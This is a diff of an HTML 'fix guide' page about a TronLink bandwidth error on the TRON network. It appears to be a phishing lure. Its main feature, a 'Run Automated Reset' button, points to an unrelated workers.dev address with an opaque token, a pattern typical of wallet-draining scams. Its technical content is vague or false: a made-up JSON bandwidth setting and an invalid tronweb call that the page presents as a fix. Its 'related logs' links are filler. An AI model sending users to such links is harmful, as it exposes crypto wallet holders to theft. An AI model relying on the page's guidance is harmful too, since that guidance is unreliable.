@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>TronLink Bandwidth Error – Fix Guide</title>
+<head><meta charset="UTF-8"><title>Tronlink Bandwidth Error – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #0a0c10;
+        font-family: sans-serif;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #ff7b2c;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -39,39 +39,32 @@
 </head>
 <body>
 <div class="content">
-<h1>TronLink Bandwidth Error</h1>
+<h1>Tronlink Bandwidth Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message stating "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network using TronLink.</li>
+<li>Users encounter an error message indicating a bandwidth issue while attempting to perform transactions or interact with smart contracts on the TRON network using TronLink.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth or incorrect bandwidth settings in the user's TronLink account, which is required for transaction processing on the TRON network.</li>
+<li>The error occurs due to insufficient bandwidth, which is a resource required for transaction processing on the TRON network. Bandwidth is consumed when sending transactions, and if a user's account does not have enough bandwidth, transactions will fail.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the account bandwidth by freezing TRX tokens for bandwidth:</li>
-<li>Use the TronLink interface to freeze TRX for bandwidth</li>
-<li>Utilize the TRON command-line tools to adjust bandwidth settings</li>
-<li>Adjust the <code>bandwidth</code> parameter in the following JSON configuration:</li>
+<li>Increase bandwidth by freezing TRX tokens, which allocates more bandwidth to the user's account.</li>
+<li>Use the TRON Web3 API to check the current bandwidth points and adjust accordingly.</li>
+<li>Execute the following command to unfreeze TRX and reclaim bandwidth:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;account&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;bandwidth&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;frozen&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.unfreezeBalance<span class="o">(</span>tronweb.transactionBuilder.freezeBalance.unfreezeTRX<span class="o">)</span><span class="p">;</span>
 </code></pre></div>
 
-<p>Consider using an external console for more complex adjustments.</p>
+<p>Consider utilizing an external console for advanced debugging and transaction construction.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>TRX tokens available for freezing</li>
-<li>TronLink account set up and configured</li>
-<li>Basic understanding of TRON network and TronLink functionality</li>
+<li>A TRON-based wallet like TronLink.</li>
+<li>A basic understanding of TRON's resource management system.</li>
+<li>Sufficient TRX tokens for freezing to increase bandwidth.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-unable-to-cancel-pending-transaction-due.html">Metamask Extension Bug Unable To Cancel Pending Transaction Due</a></li><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">Java Tron Feature Tron Post Quantum Signature Migration</a></li><li><a href="./archive/2026/06/go-ethereum-latest-geth-upgrade-resulted-in-a-chain-gap-i-think.html">Go Ethereum Latest Geth Upgrade Resulted In A Chain Gap I Think</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-all-scripts-load.html">Metamask Extension Using Waituntil To Ensure All Scripts Load</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-async-storage-writ.html">Metamask Extension Using Waituntil To Ensure Async Storage Writes Finish</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-async-storage-writ.html">Metamask Extension Using Waituntil To Ensure Async Storage Writes Finish</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
